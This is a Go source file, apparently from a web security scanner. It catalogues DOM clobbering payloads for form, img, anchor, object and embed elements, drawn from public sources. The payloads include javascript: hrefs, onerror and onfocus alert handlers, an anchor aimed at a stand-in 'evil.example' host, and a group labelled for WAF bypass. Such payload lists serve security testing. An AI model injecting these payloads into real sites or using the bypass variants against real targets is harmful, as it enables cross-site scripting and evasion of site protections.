package domclobber

// Element represents the HTML element type used for DOM clobbering.
type Element string

const (
	// ElemForm represents the <form> element used for DOM clobbering.
	ElemForm Element = "form"
	// ElemImg represents the <img> element used for DOM clobbering.
	ElemImg Element = "img"
	// ElemAnchor represents the <a> element used for DOM clobbering.
	ElemAnchor Element = "anchor"
	// ElemObject represents the <object> element used for DOM clobbering.
	ElemObject Element = "object"
	// ElemEmbed represents the <embed> element used for DOM clobbering.
	ElemEmbed Element = "embed"
)

// Payload represents a DOM clobbering payload.
type Payload struct {
	Value          string
	Element        Element
	Description    string
	TargetProperty string // DOM property this payload aims to clobber
	WAFBypass      bool
}

// GetPayloads returns all DOM clobbering payloads.
func GetPayloads() []Payload {
	var all []Payload
	all = append(all, formPayloads...)
	all = append(all, imgPayloads...)
	all = append(all, anchorPayloads...)
	all = append(all, objectPayloads...)
	all = append(all, embedPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// GetPayloadsByElement returns payloads filtered by HTML element type.
func GetPayloadsByElement(elem Element) []Payload {
	var result []Payload
	for _, p := range GetPayloads() {
		if p.Element == elem {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// Form-based DOM clobbering payloads.
// Source: PortSwigger, HackTricks
var formPayloads = []Payload{
	{Value: `<form id=x>`, Element: ElemForm, Description: "Form with id to clobber named property", TargetProperty: "x"},
	{Value: `<form id=document>`, Element: ElemForm, Description: "Form clobbering document reference", TargetProperty: "document"},
	{Value: `<form id=location>`, Element: ElemForm, Description: "Form clobbering location property", TargetProperty: "location"},
	{Value: `<form name=getElementById>`, Element: ElemForm, Description: "Form clobbering getElementById", TargetProperty: "getElementById"},
	{Value: `<form id=cookie>`, Element: ElemForm, Description: "Form clobbering cookie property", TargetProperty: "cookie"},
}

// Img-based DOM clobbering payloads.
// Source: PortSwigger, HackTricks
var imgPayloads = []Payload{
	{Value: `<img name=x>`, Element: ElemImg, Description: "Img with name to clobber named property", TargetProperty: "x"},
	{Value: `<img name=innerHTML>`, Element: ElemImg, Description: "Img clobbering innerHTML property", TargetProperty: "innerHTML"},
	{Value: `<img name=domain>`, Element: ElemImg, Description: "Img clobbering document.domain", TargetProperty: "domain"},
	{Value: `<img name=forms>`, Element: ElemImg, Description: "Img clobbering document.forms", TargetProperty: "forms"},
}

// Anchor-based DOM clobbering payloads.
// Source: PortSwigger, HackTricks
var anchorPayloads = []Payload{
	{Value: `<a id=x name=x>`, Element: ElemAnchor, Description: "Anchor with id and name for dual clobbering", TargetProperty: "x"},
	{Value: `<a id=x name=x href=javascript:alert(1)>`, Element: ElemAnchor, Description: "Anchor clobbering with javascript href", TargetProperty: "x"},
	{Value: `<a id=toString href=javascript:void(0)>`, Element: ElemAnchor, Description: "Anchor clobbering toString", TargetProperty: "toString"},
	{Value: `<a id=url href=https://evil.example>`, Element: ElemAnchor, Description: "Anchor clobbering url property", TargetProperty: "url"},
}

// Object-based DOM clobbering payloads.
// Source: PortSwigger
var objectPayloads = []Payload{
	{Value: `<object id=x>`, Element: ElemObject, Description: "Object clobbering named property", TargetProperty: "x"},
	{Value: `<object id=x data=javascript:alert(1)>`, Element: ElemObject, Description: "Object clobbering with javascript data", TargetProperty: "x"},
	{Value: `<object name=location>`, Element: ElemObject, Description: "Object clobbering location", TargetProperty: "location"},
}

// Embed-based DOM clobbering payloads.
// Source: PortSwigger
var embedPayloads = []Payload{
	{Value: `<embed name=x>`, Element: ElemEmbed, Description: "Embed clobbering named property", TargetProperty: "x"},
	{Value: `<embed name=navigator>`, Element: ElemEmbed, Description: "Embed clobbering navigator", TargetProperty: "navigator"},
}

// WAF bypass payloads that use encoding or alternative syntax.
// Source: PayloadsAllTheThings
var wafBypassPayloads = []Payload{
	{Value: `<form id=x tabindex=0 onfocus=alert(1)>`, Element: ElemForm, Description: "Form clobbering with event handler bypass", TargetProperty: "x", WAFBypass: true},
	{Value: `<img name=x onerror=alert(1) src=x>`, Element: ElemImg, Description: "Img clobbering with error event bypass", TargetProperty: "x", WAFBypass: true},
	{Value: `<a id=x name=x tabindex=0>`, Element: ElemAnchor, Description: "Anchor clobbering with tabindex bypass", TargetProperty: "x", WAFBypass: true},
}
